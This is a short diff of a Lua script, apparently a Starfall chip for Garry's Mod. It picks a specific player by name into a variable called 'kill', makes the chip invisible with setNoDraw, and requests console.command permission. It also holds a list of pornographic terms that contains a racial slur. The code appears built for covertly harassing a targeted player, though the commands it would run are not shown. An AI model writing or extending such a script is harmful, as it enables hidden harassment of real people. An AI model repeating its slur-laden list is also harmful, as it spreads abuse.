@@ -2,12 +2,12 @@
 --@author
 --@client
 
-kill = find.playersByName("Lamar")[1]
-kill = find.playersByName("IamHappy")[2]
+kill = find.playersByName("Momo")[1]
+--kill = find.playersByName("IamHappy")[2]
 print(kill)
 local Names = {"furry","porn","gayPorn","hentai","FullHDporn","NIGGERPORN","kopro","big_ass","fisting","anime_sex","gay"}
 
-
+chip():setNoDraw(true)
 
 setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
 local permissionSatisfied = hasPermission("console.command")
